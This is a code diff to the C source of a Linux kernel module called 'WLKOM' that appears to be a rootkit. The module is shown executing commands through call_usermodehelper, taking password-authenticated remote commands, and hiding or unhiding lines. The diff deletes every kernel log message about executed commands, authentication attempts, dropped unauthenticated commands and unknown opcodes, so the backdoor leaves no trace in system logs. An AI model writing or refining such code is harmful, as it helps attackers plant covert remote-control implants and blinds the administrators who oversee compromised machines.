@@ -100,9 +100,6 @@ static void exec_command(const char *cmd, char **output, size_t *output_len)
     envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
     envp[2] = NULL;
 
-    if (has_redirect)
-        pr_info("WLKOM exec: redirect detected, executing: %s\n", full_cmd);
-
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
     if (!has_redirect)
@@ -118,7 +115,6 @@ static void exec_command(const char *cmd, char **output, size_t *output_len)
     {
         *output = kstrdup("OK", GFP_KERNEL);
         *output_len = 2;
-        pr_info("WLKOM exec: redirect completed\n");
     }
 
     kfree(full_cmd);
@@ -135,13 +131,11 @@ static int handle_auth(conn_ctx_t *ctx, char *payload, uint32_t len)
 {
     if (len == 0 || !ctx->password || strncmp(payload, ctx->password, len) != 0)
     {
-        pr_warn("WLKOM commands: bad password\n");
         send_packet(ctx, CMD_AUTH, "FAIL", 4);
         return -1;
     }
     ctx->authed = true;
     send_packet(ctx, CMD_AUTH, "OK", 2);
-    pr_info("WLKOM commands: authenticated\n");
     return 0;
 }
 
@@ -293,10 +287,7 @@ static void handle_hide_line(conn_ctx_t *ctx, char *payload, uint32_t len,
 int handle_packet(conn_ctx_t *ctx, uint8_t opcode, char *payload, uint32_t len)
 {
     if (opcode != CMD_AUTH && !ctx->authed)
-    {
-        pr_warn("WLKOM commands: unauthenticated command, dropping\n");
         return 0;
-    }
     switch (opcode)
     {
     case CMD_AUTH:        return handle_auth(ctx, payload, len);
@@ -309,7 +300,6 @@ int handle_packet(conn_ctx_t *ctx, uint8_t opcode, char *payload, uint32_t len)
     case CMD_HIDE_LINE:   handle_hide_line(ctx, payload, len, true);        break;
     case CMD_UNHIDE_LINE: handle_hide_line(ctx, payload, len, false);       break;
     default:
-        pr_warn("WLKOM commands: unknown opcode 0x%02x\n", opcode);
         break;
     }
     return 0;
